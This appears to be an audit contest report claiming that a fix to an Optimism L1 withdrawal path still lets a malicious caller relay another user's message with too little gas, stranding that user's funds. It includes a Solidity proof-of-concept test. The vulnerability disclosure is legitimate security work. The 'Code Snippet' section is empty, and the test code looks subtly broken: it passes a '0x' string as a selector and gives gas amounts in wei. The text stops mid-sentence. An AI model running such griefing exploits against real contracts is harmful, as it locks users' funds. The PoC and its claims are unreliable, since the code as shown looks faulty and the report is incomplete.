## Summary
Malicious user can finalize other’s withdrawal with less than specified gas limit, leading to loss of funds even after the fix
## Vulnerability Detail
This is a high vulnerability which was present in the previous contest. Although it has received a fix, the issue still remains even after said fix. Let me demonstrate how that is below.

Like the previous report said. :"Withdrawals can be initiated directly from the L2ToL1MessagePasser contract on L2. These withdrawals can be withdrawn directly from the OptimismPortal on L1. This path is intended to be used only by users who know what they are doing, presumably to save the gas of going through the additional more “user-friendly” contracts.
"

The issue is in the fix. while the fix was supposed to ensure that the previous bug was fixed. Even after the fix, the bug remains, we just have to do more gas tweaking to achieve the desired result.

below are the fixes the team has deployed
## Impact
A malicious user can call `finalizeWithdrawalTransaction()` on behalf of a user with enough gas to pass checks but not enough for execution to succeed even after the fix that was implemented.
## Code Snippet

## Proof Of Concept

below is a test that demonstrates how a maliciouse user can still specify a gas that can pass checks but also reverts which will cause a user's funds to be stuck
```solidity
 function testOutOfGas() public {

        address bob = address(1231231243);

        console.log(bob.balance);

        uint256 minGasLimit = 30000 wei;

        address sender = address(this);

        address target = bob;

        bytes memory message = abi.encodeWithSelector(
            '0x',
            messager,
            4,
            sender,
            target,
            1 ether,
            minGasLimit
        );

         messager.relayMessage{value: 1 ether, gas: 30000 wei}(
            4,
            sender,
            target,
            1 ether,
            minGasLimit,
            message
        );

        console.log(bob.balance);

    }
```
in the test above when we set gas to
